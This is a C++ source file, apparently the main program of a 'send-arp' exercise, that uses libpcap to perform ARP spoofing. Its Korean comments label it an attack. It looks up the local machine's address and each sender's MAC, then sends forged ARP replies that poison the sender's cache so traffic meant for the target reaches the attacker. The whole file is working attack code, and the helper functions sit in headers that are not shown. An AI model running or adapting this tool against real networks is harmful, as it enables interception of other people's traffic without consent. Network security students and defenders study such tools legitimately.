#include <cstdio>
#include <pcap.h>
#include "ethhdr.h"
#include "arphdr.h"
#include "request.h"

#pragma pack(push, 1)
struct EthArpPacket final {
	EthHdr eth_;
	ArpHdr arp_;
};
#pragma pack(pop)

void usage() {
	printf("syntax : send-arp <interface> <sender ip> <target ip> [<sender ip 2> <target ip 2> ...]\n");
	printf("sample : send-arp wlan0 192.168.10.2 192.168.10.1\n");
}

int main(int argc, char* argv[]) {
	if (argc < 4) {
		usage();
		return -1;
	}

	char* dev = argv[1];
	char errbuf[PCAP_ERRBUF_SIZE];
	pcap_t* handle = pcap_open_live(dev, BUFSIZ, 1, 1, errbuf);
	if (handle == nullptr) {
		fprintf(stderr, "couldn't open device %s(%s)\n", dev, errbuf);
		return -1;
	}
	
	
	uint32_t ATTACKER_IP = ResolveAttackerIp(dev);
	uint8_t* attackerMac = ResolveAttackerMac(dev);
	if (attackerMac == nullptr) {
		fprintf(stderr, "Failed to resolve attacker MAC address\n");
		return -1;
	}
	PrintAttacker(attackerMac, ATTACKER_IP);
	
	// 각 (Sender, Target) 쌍에 대해 ARP 스푸핑 공격 수행
	for (int i = 2; i < argc; i += 2) {
		char* senderIp = argv[i];
		char* targetIp = argv[i + 1];
        
		// Sender의 MAC 주소를 알아내기 위한 ARP Request 전송 및 Reply 수신
		uint8_t senderMac[6];
		if (!SendArpRequest(handle, dev, senderIp, senderMac)) {
		    fprintf(stderr, "Failed to get MAC address for %s\n", senderIp);
		    continue;
		}

		// ARP Spoofing/Infection 패킷 전송
		if (!SendArpReply(handle, attackerMac, senderIp, senderMac, targetIp)) {
		    fprintf(stderr, "Failed to send ARP reply for %s\n", senderIp);
		    continue;
		}
	}

	pcap_close(handle);
}
